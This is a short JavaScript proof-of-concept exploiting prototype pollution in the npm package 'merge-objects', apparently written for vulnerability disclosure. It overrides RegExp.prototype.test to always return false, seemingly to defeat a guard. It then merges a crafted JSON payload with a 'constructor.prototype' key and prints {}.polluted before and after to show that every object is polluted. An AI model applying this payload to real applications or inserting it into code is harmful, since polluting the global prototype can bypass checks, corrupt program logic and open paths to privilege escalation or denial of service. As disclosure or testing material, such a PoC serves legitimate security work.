RegExp.prototype.test = () => false;
const merge = require('merge-objects');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
obj = {};
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);